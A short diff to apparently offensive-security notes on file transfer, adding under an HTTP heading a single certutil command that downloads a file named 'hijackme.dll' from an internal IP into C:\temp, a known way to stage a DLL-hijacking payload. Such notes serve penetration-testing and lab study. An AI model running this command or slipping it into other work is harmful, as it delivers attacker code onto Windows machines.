@@ -2,11 +2,15 @@
 
 ## Client - get files
 
-### HTTP
+#### HTTP
 
-### FTP
+```
+certutil -urlcache -split -f "http://10.9.228.20/hijackme.dll" C:\temp\hijackme.dll
+```
 
-### SMB
+#### FTP
+
+#### SMB
 
 ## Server - host files
 
